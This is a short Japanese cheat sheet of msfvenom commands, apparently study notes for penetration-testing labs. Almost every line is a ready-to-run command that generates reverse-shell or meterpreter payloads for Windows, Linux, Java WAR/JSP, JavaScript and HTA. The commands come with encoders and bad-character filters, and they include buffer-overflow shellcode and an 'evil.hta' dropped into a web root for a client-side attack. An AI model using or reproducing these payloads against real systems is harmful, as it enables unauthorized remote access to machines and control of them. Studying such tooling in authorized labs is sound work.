# msfvenom

### payloadの確認

```bash
msfvenom -l payloads > payloads.txt
cat payloads.txt | grep windows/shell | grep reverse | grep tcp
```

### フォーマットの確認

```bash
msfvenom -h
msfvenom --list formats
```

### リバースシェル（C言語）

```c
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

### rawコードシェル

```bash
msfvenom -a x86 --platform windows -p windows/exec CMD='cmd.exe' -f raw -b "\x00\x0a\x0d\xff" -o raw_shellcode.txt
```

出力ファイルをそのままncで転送するような場合に利用

### BOF用(アプリのクラッシュを防ぐシェル)

```bash
msfvenom -a x86 --platform windows -p windows/exec CMD='cmd.exe'  EXITFUNC=thread -f python -b "\x00\x0a\x12\x1a\x4e\xb1\xd5" 
```

### msfconsole用(windows)

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.86.217 LPORT=4443 -f exe -o reverse_tcp.exe
```

### tcpリバースシェル

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.86.217 LPORT=4444 -f exe > eternalblue.exe
```

### client-side attack hta

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

### elfファイル

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.153 LPORT=443 -f elf > shell.elf
```

### javascript

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.168 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
```

### War

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.130 LPORT=4444 -f raw > shell.jsp
```

